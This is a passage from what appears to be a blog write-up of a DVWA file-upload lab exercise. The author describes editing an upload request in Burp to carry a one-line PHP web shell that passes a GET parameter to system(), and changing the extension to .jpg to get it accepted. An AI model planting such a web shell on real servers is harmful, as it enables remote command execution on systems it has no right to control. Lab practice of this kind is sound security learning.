...
<p>So I edited the request on Burp and changed the php code to a one liner php code that uses hyst as a parameter - <i><?phpsystem($_GET[‘hyst’]);?></i><br><img src="/assets/images/dvwa/upload/17.png" alt="" /><br>I sent the edited request to repeater and this works as long as I also change the file extension to jpg. And I still can't get it to execute my code. Will research more about this later but for now we have successfully uploaded the file.</p>
